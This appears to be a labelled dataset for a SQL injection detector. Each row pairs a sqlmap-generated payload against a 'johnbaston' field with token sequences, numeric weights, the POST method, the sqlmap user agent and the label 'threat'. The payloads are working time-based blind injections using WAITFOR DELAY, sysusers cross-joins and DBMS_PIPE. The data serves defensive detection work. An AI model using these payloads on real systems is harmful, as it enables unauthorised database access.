johnbaston') WAITFOR DELAY '0:0:5' AND ('LlrM' LIKE 'LlrM,STR SQUT RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' WAITFOR DELAY '0:0:5' AND 'PaIK' LIKE 'PaIK,STR SQUT STR STR SQUT INT CLN INT CLN INT SQUT AND SQUT STR SQUT LIKE SQUT STR,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' WAITFOR DELAY '0:0:5' AND 'PaIK' LIKE 'PaIK,STR SQUT STR STR SQUT INT CLN INT CLN INT SQUT AND SQUT STR SQUT LIKE SQUT STR,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") WAITFOR DELAY '0:0:5' AND (""sRvp""=""sRvp",STR DQUT RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN DQUT STR DQUT EQ DQUT STR,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" WAITFOR DELAY '0:0:5' AND ""wVqX""=""wVqX",STR DQUT STR STR SQUT INT CLN INT CLN INT SQUT AND DQUT STR DQUT EQ DQUT STR,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" WAITFOR DELAY '0:0:5' AND ""wVqX""=""wVqX",STR DQUT STR STR SQUT INT CLN INT CLN INT SQUT AND DQUT STR DQUT EQ DQUT STR,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') WAITFOR DELAY '0:0:5' AND ('%'=',STR PRCNT SQUT RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') WAITFOR DELAY '0:0:5' AND ('%'=',STR PRCNT SQUT RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) WAITFOR DELAY '0:0:5' AND (5205=5205,STR RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN INT EQ INT,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) WAITFOR DELAY '0:0:5' AND (5205=5205,STR RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN INT EQ INT,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) WAITFOR DELAY '0:0:5' AND ((7148=7148,STR RPRN RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN LPRN INT EQ INT,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) WAITFOR DELAY '0:0:5' AND ((7148=7148,STR RPRN RPRN STR STR SQUT INT CLN INT CLN INT SQUT AND LPRN LPRN INT EQ INT,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston WAITFOR DELAY '0:0:5',STR STR STR SQUT INT CLN INT CLN INT SQUT,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston WAITFOR DELAY '0:0:5',STR STR STR SQUT INT CLN INT CLN INT SQUT,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston WAITFOR DELAY '0:0:5'-- aMoD,STR STR STR SQUT INT CLN INT CLN INT SQUT DSCMT STR,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston WAITFOR DELAY '0:0:5'-- aMoD,STR STR STR SQUT INT CLN INT CLN INT SQUT DSCMT STR,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston')) AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('sREN'='sREN",STR SQUT RPRN RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.08695652173913043 0.10869565217391304 0.13043478260869565 0.15217391304347827 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.15217391304347827 0.13043478260869565 0.10869565217391304 0.08695652173913043,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston')) AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('sREN'='sREN",STR SQUT RPRN RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.08695652173913043 0.10869565217391304 0.13043478260869565 0.15217391304347827 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.15217391304347827 0.13043478260869565 0.10869565217391304 0.08695652173913043,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('yhbY' LIKE 'yhbY",STR SQUT RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN SQUT STR SQUT LIKE SQUT STR,0.09090909090909091 0.11363636363636365 0.13636363636363635 0.1590909090909091 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.1590909090909091 0.13636363636363635 0.11363636363636365 0.09090909090909091,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'yyHI' LIKE 'yyHI",STR SQUT AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND SQUT STR SQUT LIKE SQUT STR,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'yyHI' LIKE 'yyHI",STR SQUT AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND SQUT STR SQUT LIKE SQUT STR,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (""CLGm""=""CLGm",STR DQUT RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN DQUT STR DQUT EQ DQUT STR,0.09090909090909091 0.11363636363636365 0.13636363636363635 0.1590909090909091 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.1590909090909091 0.13636363636363635 0.11363636363636365 0.09090909090909091,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston%') AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('%'='",STR PRCNT SQUT RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN SQUT PRCNT SQUT EQ SQUT,0.09090909090909091 0.11363636363636365 0.13636363636363635 0.1590909090909091 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.1590909090909091 0.13636363636363635 0.11363636363636365 0.09090909090909091,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston%') AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('%'='",STR PRCNT SQUT RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN SQUT PRCNT SQUT EQ SQUT,0.09090909090909091 0.11363636363636365 0.13636363636363635 0.1590909090909091 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.1590909090909091 0.13636363636363635 0.11363636363636365 0.09090909090909091,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston) AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (7467=7467",STR RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN INT EQ INT,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston) AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (7467=7467",STR RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN INT EQ INT,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((2496=2496",STR RPRN RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN LPRN INT EQ INT,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((2496=2496",STR RPRN RPRN AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR AND LPRN LPRN INT EQ INT,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)",STR AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR,0.11764705882352941 0.14705882352941177 0.1764705882352941 0.20588235294117646 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.20588235294117646 0.1764705882352941 0.14705882352941177 0.11764705882352941,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston AND 1333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)",STR AND INT EQ SELECT STR STAR FROM STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR CMMA STR AS STR,0.11764705882352941 0.14705882352941177 0.1764705882352941 0.20588235294117646 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.20588235294117646 0.1764705882352941 0.14705882352941177 0.11764705882352941,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ('kHUo'='kHUo",STR SQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN SQUT STR SQUT EQ SQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ('kHUo'='kHUo",STR SQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN SQUT STR SQUT EQ SQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
